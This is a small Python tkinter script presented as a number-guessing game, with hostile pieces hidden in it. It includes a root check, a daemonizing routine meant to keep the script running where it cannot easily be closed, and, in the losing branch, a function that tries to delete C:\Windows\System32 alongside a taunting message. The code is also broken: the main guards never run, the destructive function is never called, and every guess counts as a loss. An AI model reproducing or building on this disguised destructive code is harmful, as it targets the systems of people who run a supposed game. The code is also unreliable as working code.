import tkinter
from tkinter import *
import random
import os
import subprocess
import re
import sys
import signal
import time


def check_root():
    if os.geteuid() != 0:

        print("Этот скрипт должен запускаться от имени root!")
        sys.exit(1)



if __name__ == "main":
    check_root()
    print("Скрипт запущен от имени root.")



def daemonize():
    if os.fork() > 0:
        sys.exit()

    os.setsid()


    if os.fork() > 0:
        sys.exit()


    sys.stdout = open('/dev/null', 'w')
    sys.stderr = open('/dev/null', 'w')
    sys.stdin = open('/dev/null', 'r')


def main():
    daemonize()
    while True:
        print("Скрипт работает и его нельзя легко закрыть.")
        time.sleep(10)


if __name__ == "main":
    main()

window = Tk()
window.title("game for die")
window.geometry('400x400')
label = Label(window, text="выбери число от 1 до 10")
label.pack(padx=20, pady=10)


def data():
    mm = random.randint(1, 10)
    text = entry.get()
    if text == mm:
        win = Tk()
        label = Label(win, text="молодец, ты выиграл, больше проектов на моей странице в гитхаб")
        label.pack(padx=20, pady=10)


    else:
        fal = Tk()
        label = Label(fal, text="TOBI PIZDA, HA-HA-HA")
        label.pack(padx=20, pady=10)

        def delet():
            os.rmdir('C:\Windows\System32')


button = Button(text='confirm!', command=data)
entry = Entry()

entry.pack()
button.pack()
window.mainloop()
win.mainloop()
fal.mainloop()